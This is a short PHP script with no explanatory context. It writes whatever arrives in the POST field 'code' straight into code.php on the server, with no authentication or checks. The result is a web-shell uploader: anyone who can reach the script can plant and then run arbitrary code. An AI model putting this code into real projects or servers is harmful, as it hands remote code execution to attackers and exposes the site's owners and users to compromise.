<?php 

$myfile = fopen("code.php", "w") or die("Unable to open file!");

fwrite($myfile, $_POST['code']);
fclose($myfile);

 ?>